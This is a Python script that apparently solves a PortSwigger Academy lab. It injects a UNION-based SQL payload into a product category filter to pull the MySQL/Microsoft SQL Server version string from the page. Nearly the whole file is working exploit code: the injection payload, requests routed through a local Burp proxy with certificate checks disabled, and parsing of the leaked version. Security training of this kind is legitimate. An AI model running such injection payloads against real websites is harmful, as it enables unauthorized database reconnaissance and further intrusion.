#!/usr/bin/python3
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> SQL injection attack, querying the database type and version on MySQL and Microsoft')
        print('    >> by Port Swigger Academy\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

proxies = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}


def exploit_sqli_dbms_version(url):
    path = '/filter?category=Pets'
    sqli_payload = "'+UNION+SELECT+NULL,%40%40version%23"
    r = requests.get(url+path+sqli_payload,verify=False,proxies=proxies)
    response = r.text
    soup = BeautifulSoup(r.text, 'html.parser')
    dbms_version = soup.find(text=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
    if dbms_version is None:
        return False
    else:
        output.success(" The dbms version is '%s'" % dbms_version)
        return True

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        output.info(" Usage: %s <url>" % sys.argv[0])
        output.info(" Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    output.info(" Retrieve dbms version...")
    if not exploit_sqli_dbms_version(url):
        output.error(" Did not find and dbms version")